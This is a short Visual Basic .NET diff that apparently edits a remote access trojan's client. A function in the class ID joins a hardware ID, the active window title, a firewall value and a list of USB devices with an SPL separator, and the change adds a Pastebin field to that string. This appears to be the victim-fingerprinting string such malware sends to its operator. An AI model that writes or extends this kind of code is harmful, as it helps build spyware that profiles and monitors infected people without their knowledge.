@@ -323,7 +323,8 @@ Public Class ID
             Main.HWID & SPL &
             ActiveWindow() & SPL &
             FW() & SPL &
-            ListUSB()
+            ListUSB() & SPL &
+            Main.Pastebin
         Catch
             Return "N/A"
         End Try
